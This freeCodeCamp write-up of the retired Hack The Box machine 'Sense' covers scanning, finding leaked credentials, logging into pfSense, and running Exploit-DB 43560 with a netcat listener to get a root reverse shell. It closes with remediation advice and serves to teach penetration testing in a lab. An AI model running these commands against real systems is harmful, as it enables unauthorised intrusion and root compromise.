---
title: Keep Calm and Hack The Box - Sense
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-11-05T16:31:00.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-sense
coverImage: https://www.freecodecamp.org/news/content/images/2020/11/702551-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: information security
  slug: information-security
- name: Linux
  slug: linux
- name: Security
  slug: security
seo_title: null
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) is an online platform that allows you to test your penetration testing skills.

It contains several challenges that are constantly updated. Some of them simulate real world scenarios and some of them lean more towards a CTF style of challenge.

**Note**: _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-08-at-21.26.08.png)

Sense is fairly simple overall. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system.

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/):

* nmap
* dirbuster
* searchsploit

Let's get started!

## **Step 1 - Reconnaissance**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on this phase to get as much information as you can.

### **Port scanning**

I will use **Nmap** (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing.

It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.05.48.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v 10.10.10.60
```

**-A:** Enables OS detection, version detection, script scanning, and traceroute

**-v:** Increases verbosity level

**sense**.htb:**** hostname for the Sense box

If you find the results a little bit too overwhelming, you can try this:

```bash
nmap 10.10.10.60
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.04.31.png)

We can see that there are 2 open ports including:

**Port** 80, most often used by Hypertext Transfer Protocol (HTTP)

**Port** 443, standard port for all secured HTTP traffic

###   
Directory scanning

Still in the scanning and reconnaissance phase, I now use **DirBuster**. DirBuster is a multi threaded Java application designed to brute force directories and files names on web/application servers.

You can launch DirBuster by typing this command on the terminal:

```bash
dirbuster
```

or by searching the application:

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-21.01.31-1.png)
_Old Kali_

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.09.39.png)
_New Kali_

The application looks like this, where you can specify the target URL. In our case it will be **https://10.10.10.**60. You can select a wordlist with the list of **dirs/files** by clicking the Browse button:

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.10.33.png)

I use the **directory-list-2.3-medium.txt** for this search. We can see some interesting files here:

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.11.18.png)

## **Step 2 - Visiting the** files we got from the recon phase

Let's navigate to the **changelog.txt** file. We're getting more information around some security changelog, including patching vulnerabilities and timeline.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.12.44.png)

Another interesting file is **system-users.txt** which does contain a username and an indication for the password.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.13.16.png)

## **Step** 3 **- Visiting the web page**

Let's navigate to the website. We see a pfSense panel. 

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.18.08.png)

> **pfSense** is an open sourcefirewall/router computer software distribution based on FreeBSD. It is installed on a physical computer or a virtual machine to make a dedicated firewall/router for a network. It can be configured and upgraded through a web-based interface, and requires no knowledge of the underlying FreeBSD system to manage - Wikipedia

![Image](https://www.freecodecamp.org/news/content/images/2020/11/Screenshot-2020-11-03-at-21.24.44.png)
_https://www.pfsense.org/_

Let's Google to see if we can find the default username and password for pfSense. Bingo! We do find some documentation on Netgate Docs.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.19.03.png)
_https://docs.netgate.com/pfsense/en/latest/solutions/m1n1wall/getting-started.html_

I try the username **Rohit** and the password **pfsense** on the login page and I'm in! I have a look at the dashboard and other information I could gather. We can see which specific version we're on - **2.1.3-RELEASE (amd64)**.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.19.37.png)

## **Step** 4 **-** Looking for an exploit

I use **Searchsploit** to check if there is any known exploit. Searchsploit is a command line search tool for [Exploit Database](https://www.exploit-db.com/).

I use the following command:

```bash
searchsploit pfsense
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.21.06.png)

I get more details on an exploit with:

```bash
searchsploit -x 43560.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.23.18.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.22.51.png)

You can also check the **Exploit Database** to find the same exploit.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.20.33.png)
_https://www.exploit-db.com/exploits/43560_

I get more information with:

```bash
searchsploit -p 43560.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.23.55.png)

I can see where it is located on my Kali box. I copy the file in my **Sense** folder with:

```bash
cp /usr/share/exploitdb/exploits/linux/remote/43560.py .
```

and to check if it has been copied in this folder:

```bash
ls -la
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.24.23.png)

On one terminal (right side) I set up a listener with:

```bash
nv -nvlp 1234
```

I then set up the exploit (left side) with:

```bash
python 43560.py --rhost 10.10.10.60 --lhost 10.10.14.13 --lport 1234 --username rohit --password pfsense
```

I got a shell as root!

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.24.51.png)

I start gathering some basic info. **id** returns the real user ID of the calling process.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.25.41.png)

## **Step** 5 **- **Looking for the user.txt flag****

I navigate to the **rohit** folder from **home**.

I can list all the files/folders with the following command:

```bash
ls -la
```

I then move to the **home** folder with:

```bash
cd home
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.26.25.png)

And I find the user flag! I check the contents of the file with:

```bash
cat user.txt
```

## **Step 5 -** Looking for the root.txt flag

Let's find the root flag now. I navigate up to **root**.

I find the root.txt file and check its content with:

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.27.01.png)

Congrats! You found both flags.

## **Remediations**

* Do not store sensitive information such as login credentials or your patching status on a plaintext file on the webserver
* The pfsense application should be patched to latest
* Make sure to change the default password when you're setting up new applications/servers/platforms
* Apply the p[rinciple of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) to all your systems and services

Please don’t hesitate to ask questions or share with your friends :)

You can see more articles from the series **Keep Calm and Hack the Box** [here](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

![Image](https://www.freecodecamp.org/news/content/images/2020/11/702551.jpg)

